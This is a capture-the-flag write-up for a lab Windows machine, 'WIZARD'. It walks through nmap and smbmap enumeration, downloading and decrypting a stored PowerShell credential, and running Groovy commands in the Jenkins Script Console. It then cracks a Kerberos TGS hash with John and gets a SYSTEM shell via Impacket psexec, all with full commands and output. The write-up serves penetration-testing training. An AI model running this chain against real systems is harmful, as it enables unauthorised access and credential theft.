---
layout: post
title: "CTF7E4 - WIZARD Machine"
categories: CTF7E4
---

## Summary
&nbsp;
This machine was more about enumeration and privilege escalation. From a public smb share to *NT\Authority System*.
&nbsp;

- **OS:** Windows
- **IP:** 10.10.10.66
- **Difficulty:** Medium/Hard

## Steps
&nbsp;

In order to hack this machine, we should know what ports are open and we can do that by using a popular tool such as Nmap.

> **→ nmap -sC -sV -oN scan 10.10.10.66 -Pn**{: style="color: red"}

**-sC** Use default scripts
**-sV** Probe open ports to determine service/version info
**-oN** Save output in nmap format.
**-Pn** Treat all hosts as online
&nbsp;

```
Nmap scan report for 10.10.10.66
Host is up (0.012s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: WORKGROUP)
8080/tcp open  http         Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: Host: WIN-V1LSDDMFJH2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h38m47s, deviation: 4h37m09s, median: -1m14s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: WIN-V1LSDDMFJH2
|   NetBIOS computer name: WIN-V1LSDDMFJH2\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-02-03T04:46:15-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-03T12:46:12
|_  start_date: 2020-01-31T10:09:47
```
&nbsp;
&nbsp;

From the nmap output we can see that Jenkins is running on port 8080 and it's vulnerable to remote code execution if we can log into it but common credentials such as admin:admin didn't work. So we will continue enumeration on port 445 and see if we can login with a Guest user.

> **→ smbmap -H 10.10.10.66 -u Guest**{: style="color: red"}

```pl
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.66...
[+] IP: 10.10.10.66:445	Name: 10.10.10.66                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	erik_stuff                                        	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	Users                                             	READ ONLY	
```
&nbsp;

From the smbmap output we can see that Guest user has **read** access on some specific shares, Erik must be a user on this machine so we will continue searching for files on **erik_stuff** share.

> **→ smbmap -H 10.10.10.66 -u Guest -r erik_stuff**{: style="color: red"}

```pl
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.66...
[+] IP: 10.10.10.66:445	Name: 10.10.10.66                                       
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	erik_stuff                                        	READ ONLY	
	./                                                 
	dr--r--r--                0 Mon Jan 13 16:58:16 2020	.
	dr--r--r--                0 Mon Jan 13 16:58:16 2020	..
	fr--r--r--              926 Mon Jan 13 16:58:16 2020	encrypted_password.txt
	fr--r--r--              523 Mon Jan 13 16:58:16 2020	script.ps1
```
&nbsp;

We can download these files with the **\--download** parameter.

> **→ smbmap -H 10.10.10.66 -u Guest \--download 'erik_stuff\\encrypted_password.txt'**{: style="color: red"}

[+] File output to: /home/arbenn/10.10.10.66-erik_stuff_encrypted_password.txt
> **→ smbmap -H 10.10.10.66 -u Guest \--download 'erik_stuff\\script.ps1'**{: style="color: red"}

[+] File output to: /home/arbenn/10.10.10.66-erik_stuff_script.ps1
&nbsp;

> **→ cat encrypted_password.txt**{: style="color: red"}

```
ÿþ01000000d08c9ddf0115d1118c7a00c04fc297eb0100000032a2c10aa2112746bba2bef58ef97a3d00000000020000000000106600000001000020000000303ac14eaa03cd52e849a7f25d34233e95955487b4ea9ac16a2551341c6bc3df000000000e8000000002000020000000bd9be6ee29a1169517096165983fe5bbcc8169bee4abf2fbd78ff3a381c88bc310000000c30cea93d6e30e3fb8e9456074162cd9400000009338d3ccee8982439b371b1ac33766310e38ada31357e1fe388a8a87364b83721e8ad9234e610a15123c5ece7ee0f45c2c4f04a8926a36d132edaafc5c786d56
```

> **→ cat script.ps1**{: style="color: red"}

```powershell
# PS1 script to start jenkins as local user
# User and Password as cli argument
$username = "erik"
$erikpass = Get-Content "encrypted_password.txt" | ConvertTo-SecureString
$cred = New-Object System.Management.Automation.PSCredential($username,$erikpass)

# To Do
$srvName = "Jenkins"
$servicePrior = Get-Service $srvName
"$srvName is now " + $servicePrior.status
Set-Service $srvName -startuptype manual
Restart-Service $srvName
$serviceAfter = Get-Service $srvName
"$srvName is now " + $serviceAfter.status%  
```
&nbsp;

It seems that script.ps1 is trying to start Jenkins as user Erik but what's vulnerable here it's that is using the password stored in **encrypted_password.txt**. We have earlier downloaded this file so we can easily decrypt it using powershell. 
&nbsp;

&nbsp;
![wizard]({{ site.baseurl }}/assets/images/ctf7e4/machines/wizard0.png){:.images}
&nbsp;

```powershell
$password = Get-Content "encrypted_password.txt" | ConvertTo-SecureString
$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)
$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
$result

\4Eb]y
```
&nbsp;

After decrypting the password to clear text with powershell which resulted to **\4Eb]y**, we can then use it to log into Jenkins as an admin user.

&nbsp;
![wizard]({{ site.baseurl }}/assets/images/ctf7e4/machines/wizard1.png){:.images}
&nbsp;

&nbsp;
![wizard]({{ site.baseurl }}/assets/images/ctf7e4/machines/wizard2.png){:.images}
&nbsp;

We are going to use the **Script Console** plugin since we can execute arbitrary Groovy scripts with it.

&nbsp;
![wizard]({{ site.baseurl }}/assets/images/ctf7e4/machines/wizard3.png){:.images}
&nbsp;

After some enumration on the target machine we found an important file located on Erik's desktop.
&nbsp;

```java
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = "cmd /c dir c:\\Users\\erik\\Desktop\\old_stuff".execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "$sout"
```

&nbsp;
![wizard]({{ site.baseurl }}/assets/images/ctf7e4/machines/wizard6.png){:.images}
&nbsp;

```java
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = "cmd /c type c:\\Users\\erik\\Desktop\\old_stuff\\administrator.hash".execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "$sout"
```
&nbsp;

&nbsp;
![wizard]({{ site.baseurl }}/assets/images/ctf7e4/machines/wizard7.png){:.images}
&nbsp;

> **→ cat administrator.hash**{: style="color: red"}

```
$krb5tgs$23$*Administrator$WIZARD.XOR$active/CIFS~445*$09a16612e21d8979ea1a2025ae9bc848$40579360035c960293a35a2509a6d6cfa5e1e6ad1b7ec03ca22e6875d33abbe4eb6e099d7a1a03b6820514f96806b1f9938590bbcc8c25889f26800b3b4baf4a905aabf2aa32efaca6b20c8e2252f79f7f98a35ce4684e468ef5f0b48286bc18cdc590999cc20ca4620dddd8567f7e6d2b9c3984643d43a129afffea2cd99f92b74003cf41f3540b312d6203b84a1edae1888010fdb21868058683f3699e191539a303a46a4a03ba8bb9e1928a9683d4250b8838f7ad4491ef8ad2ff9c81a47b42362b0e6b9cd5351bd532406c951db6063083c052b0b685627e190c898cecc4262286124abb68f757e6265f27e826f9097c3a1d67b546829d738153e986f2f60c18e56e48ecd8abcd97f11e0d2ea05e28544b8779e2b9c34f6fd604cedd43a44b69dc4fdd7018c18d7d58c82b2974e91aba29a3cb279d3da43e9fb8717a86476cdae2a120f4e417afea631503191ca1b80e8343350c35943940057b02b28c4289f83206617d41c0bc1e7b05f2216e7cb0ede9b0d4243f35af58da01d5f0a5391fe4eb51c22dad7cce6f3b5e6976081541c1a100be9326f8e725969344e0859bc3a7683bd53874de6423402d9c20a1f9a62ad8cf399dc31d5eb67fa684f2ffcc9dc64c9d24cc1cb8ae33a56162f79ba96db62bfa0e64c1d6f5dcf34093864805a751b883a616a77f1460e9df5a6a38850649dad3679124b173d2fe5d71fcf3324f1d077565dc83f62328510fdee30849dcbe37f8c267bdc36e720ba2d41282778a4fc2292f2d9cdfe54d7eb5cde85ab4cfb82d7c4700d500503d83529788787794392b8720c67b23460c5473fe604a83a837c16e95c338352c32a1d79deddd079ab5dd81f6f86f9cbab517890ee3cd0dfd648e71b56ce314f7de4f07ebe2345eb361362995a03be531841723f83fb12793a5548890d9445bde2fd17d7ac7ba45913254385f4c9cd45c70968b5ee6f6be9931ec4eb0767d5514b86bf287cc84ce044f3abbcff0efc9d5d0dc62f38f3a7cce73a706157e5181c60be9017b3bd5bcc50a154fdd602ea6bc753c8a4c7199f58a13be861b107a1ce9190e3b0d1f706dd26921599b80f6b9027cbc3dde9b6e758fb174ecdc7ddd696159e22755c566152b0cec57c07e1b466a720e76ac23b1a3ffa8c2867a1f85b1a055641bce8357a07e964ed4d54ef1f561dc15b3792c994fad51887f5de85dc0707698fa2c8e7cae121a7d3f1842ef2cae417b2d0a3cf5e105360df89fdef97c8349
```
&nbsp;

This looks like a Kerbreos hash which was previously extracted with **GetUserSPNs.py** from Impacket. Lucky for us we can decrypt this using John and later use it as an Administrator password.

> **→ john administrator.hash --wordlist=~/tools/SecLists/Passwords/rockyou.txt**{: style="color: red"}

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
No password hashes left to crack (see FAQ)                                              
?:Ticketmaster1968
1 password hash cracked, 0 left
```

> **→ python2 psexec.py Administrator:'Ticketmaster1968'@10.10.10.66**{: style="color: red"}

```powershell
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.66.....
[*] Found writable share ADMIN$
[*] Uploading file uZIDWCrQ.exe
[*] Opening SVCManager on 10.10.10.66.....
[*] Creating service sgda on 10.10.10.66.....
[*] Starting service sgda.....
[!] Press help for extra shell commands                                                                         Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami                                                                                      nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt.txt                                            XOR{6e1773e7187824ec9458dbb4dda3f4139f4e241a}

Machine created by: twitter.com/spenkkkkk
```

&nbsp;
![wizard]({{ site.baseurl }}/assets/images/ctf7e4/machines/wizard8.png){:.images}
&nbsp;





&nbsp;
I hope you had fun solving this machine and learning something new.